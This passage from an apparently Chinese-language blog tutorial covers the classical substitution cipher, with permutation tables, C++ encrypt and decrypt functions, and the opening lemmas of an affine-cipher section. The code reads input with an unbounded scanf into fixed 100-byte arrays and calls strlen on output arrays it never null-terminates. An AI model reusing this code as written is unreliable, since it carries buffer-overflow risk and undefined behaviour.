class="katex-mathml"><math><semantics><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\pi^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>表示置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span></span></span></span>的逆置换。</li>
</ul>
<h3 id="代码实现-2"><a class="markdownIt-Anchor" href="#代码实现-2"></a> 代码实现</h3>
<ul>
<li>这里任意取一置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">π</span></span></span></span>，具体置换内容见下表（小写字母表示明文，大写字母表示密文）：</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:center">a</th>
<th style="text-align:center">b</th>
<th style="text-align:center">c</th>
<th style="text-align:center">d</th>
<th style="text-align:center">e</th>
<th style="text-align:center">f</th>
<th style="text-align:center">g</th>
<th style="text-align:center">h</th>
<th style="text-align:center">i</th>
<th style="text-align:center">j</th>
<th style="text-align:center">k</th>
<th style="text-align:center">l</th>
<th style="text-align:center">m</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">X</td>
<td style="text-align:center">N</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">A</td>
<td style="text-align:center">H</td>
<td style="text-align:center">P</td>
<td style="text-align:center">O</td>
<td style="text-align:center">G</td>
<td style="text-align:center">Z</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">W</td>
<td style="text-align:center">B</td>
<td style="text-align:center">T</td>
</tr>
<tr>
<td style="text-align:center">n</td>
<td style="text-align:center">o</td>
<td style="text-align:center">p</td>
<td style="text-align:center">q</td>
<td style="text-align:center">r</td>
<td style="text-align:center">s</td>
<td style="text-align:center">t</td>
<td style="text-align:center">u</td>
<td style="text-align:center">v</td>
<td style="text-align:center">w</td>
<td style="text-align:center">x</td>
<td style="text-align:center">y</td>
<td style="text-align:center">z</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td style="text-align:center">F</td>
<td style="text-align:center">L</td>
<td style="text-align:center">R</td>
<td style="text-align:center">C</td>
<td style="text-align:center">V</td>
<td style="text-align:center">M</td>
<td style="text-align:center">U</td>
<td style="text-align:center">E</td>
<td style="text-align:center">K</td>
<td style="text-align:center">J</td>
<td style="text-align:center">D</td>
<td style="text-align:center">I</td>
</tr>
</tbody>
</table>
<ul>
<li>则对应的逆置换<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>π</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">\pi^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> 为下表：</li>
</ul>
<table>
<thead>
<tr>
<th>A</th>
<th style="text-align:center">B</th>
<th style="text-align:center">C</th>
<th style="text-align:center">D</th>
<th style="text-align:center">E</th>
<th style="text-align:center">F</th>
<th style="text-align:center">G</th>
<th style="text-align:center">H</th>
<th style="text-align:center">I</th>
<th style="text-align:center">J</th>
<th style="text-align:center">K</th>
<th style="text-align:center">L</th>
<th style="text-align:center">M</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td style="text-align:center">l</td>
<td style="text-align:center">r</td>
<td style="text-align:center">y</td>
<td style="text-align:center">v</td>
<td style="text-align:center">o</td>
<td style="text-align:center">h</td>
<td style="text-align:center">e</td>
<td style="text-align:center">z</td>
<td style="text-align:center">x</td>
<td style="text-align:center">w</td>
<td style="text-align:center">p</td>
<td style="text-align:center">t</td>
</tr>
<tr>
<td>N</td>
<td style="text-align:center">O</td>
<td style="text-align:center">P</td>
<td style="text-align:center">Q</td>
<td style="text-align:center">R</td>
<td style="text-align:center">S</td>
<td style="text-align:center">T</td>
<td style="text-align:center">U</td>
<td style="text-align:center">V</td>
<td style="text-align:center">W</td>
<td style="text-align:center">X</td>
<td style="text-align:center">Y</td>
<td style="text-align:center">Z</td>
</tr>
<tr>
<td>b</td>
<td style="text-align:center">g</td>
<td style="text-align:center">f</td>
<td style="text-align:center">j</td>
<td style="text-align:center">q</td>
<td style="text-align:center">n</td>
<td style="text-align:center">m</td>
<td style="text-align:center">u</td>
<td style="text-align:center">s</td>
<td style="text-align:center">k</td>
<td style="text-align:center">a</td>
<td style="text-align:center">c</td>
<td style="text-align:center">i</td>
</tr>
</tbody>
</table>
<ul>
<li>代码展示如下：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">char</span>&gt; E_k = &#123; &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;X&#x27;</span>&#125; ,&#123;<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;N&#x27;</span>&#125;,&#123;<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>&#125;,&#123;<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;A&#x27;</span>&#125;,&#123;<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;H&#x27;</span>&#125;,&#123;<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;P&#x27;</span>&#125;,&#123;<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;,&#123;<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;G&#x27;</span>&#125;,&#123;<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>&#125;,&#123;<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>&#125;,&#123;<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;W&#x27;</span>&#125;,&#123;<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;B&#x27;</span>&#125;,&#123;<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;T&#x27;</span>&#125;,&#123;<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;S&#x27;</span>&#125;,&#123;<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;F&#x27;</span>&#125;,&#123;<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;L&#x27;</span>&#125;,&#123;<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>&#125;,&#123;<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;C&#x27;</span>&#125;,&#123;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;V&#x27;</span>&#125;,&#123;<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;M&#x27;</span>&#125;,&#123;<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;U&#x27;</span>&#125;,&#123;<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;E&#x27;</span>&#125;,&#123;<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;K&#x27;</span>&#125;,&#123;<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;J&#x27;</span>&#125;,&#123;<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;,&#123;<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;I&#x27;</span>&#125; &#125;;</span><br><span class="line">map&lt;<span class="keyword">char</span>,<span class="keyword">char</span>&gt; C_K=&#123;&#123;<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;l&#x27;</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;r&#x27;</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;y&#x27;</span>&#125;,&#123;<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;v&#x27;</span>&#125;,&#123;<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;o&#x27;</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;h&#x27;</span>&#125;,&#123;<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;e&#x27;</span>&#125;,&#123;<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;z&#x27;</span>&#125;,&#123;<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;x&#x27;</span>&#125;,&#123;<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;w&#x27;</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;p&#x27;</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;t&#x27;</span>&#125;,&#123;<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;b&#x27;</span>&#125;,&#123;<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;g&#x27;</span>&#125;,&#123;<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;f&#x27;</span>&#125;,&#123;<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;j&#x27;</span>&#125;,&#123;<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;q&#x27;</span>&#125;,&#123;<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;n&#x27;</span>&#125;,&#123;<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;m&#x27;</span>&#125;,&#123;<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;s&#x27;</span>&#125;,&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;k&#x27;</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;a&#x27;</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;,&#123;<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;i&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_E</span><span class="params">()</span>  <span class="comment">//加密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;p);</span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(p); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">auto</span> x = E_k.<span class="built_in">find</span>(p[i]);</span><br><span class="line">		c[i] = x-&gt;second;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(c); i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, c[i]);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Sub_D</span><span class="params">()</span>  <span class="comment">//解密实现</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> x=C_K.<span class="built_in">find</span>(c[i]);</span><br><span class="line">        p[i]=x-&gt;second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;明文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>实例实现效果如下：</li>
</ul>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210417235745.png" alt="alt 代换密码" /></p>
<h2 id="仿射密码"><a class="markdownIt-Anchor" href="#仿射密码"></a> 仿射密码</h2>
<h3 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h3>
<ul>
<li>引理1：设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>∈</mo><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">a\in Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，则对于任意的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>∈</mo><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">b\in Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> ，同余方程<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>x</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ax\equiv b(mod\;m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>有唯一解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∈</mo><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">x\in Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的充分必要条件是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(a,m)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</li>
<li>引理2：假定<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><msubsup><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><msubsup><mi>p</mi><mi>i</mi><msub><mi>e</mi><mi>i</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">m=\prod_{i=1}^np_i^{e_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span></span></span></span>，这里<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">p_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>均为素数且互不相同，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>&gt;</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo>≤</mo><mi>i</mi><mo>≤</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">e_i&gt;0,1\leq i\leq n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79549em;vertical-align:-0.13597em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>。则关于其欧拉函数<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mo>∏</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo stretchy="false">(</mo><msubsup><mi>p</mi><mi>i</mi><msub><mi>e</mi><mi>i</mi></msub></msubsup><mo>−</mo><msubsup><mi>p</mi><mi>i</mi><mrow><msub><mi>e</mi><mi>i</mi></msub><mo>−</mo><mn>1</mn></mrow></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(m)=\prod_{i=1}^n(p_i^{e_i}-p_i^{e_i-1})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.104002em;vertical-align:-0.29971000000000003em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∏</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.29971000000000003em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.172872em;vertical-align:-0.276864em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8960079999999999em;"><span style="top:-2.4231360000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span><span style="top:-3.1449000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathdefault mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.276864em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</li>
